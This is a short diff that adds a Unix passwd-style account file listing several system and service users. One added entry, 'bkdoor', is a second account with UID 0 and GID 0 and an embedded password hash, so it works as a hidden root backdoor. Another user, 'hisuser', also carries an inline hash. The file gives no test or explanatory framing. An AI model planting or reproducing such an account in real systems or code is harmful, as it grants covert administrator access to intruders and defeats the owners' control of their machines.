@@ -1,0 +1,6 @@
+root:*:0:3::/:/sbin/sh
+daemon:*:1:5::/:/sbin/sh
+bin:*:2:2::/usr/bin:/sbin/sh
+bkdoor:Kx8pQ2wR9zAb:0:0::/home/bkdoor:/usr/bin/sh
+oracle:*:104:102:Oracle:/u01/oracle:/usr/bin/ksh
+hisuser:Mn3bV7cX1zQw:210:20:HIS User:/home/hisuser:/usr/bin/ksh
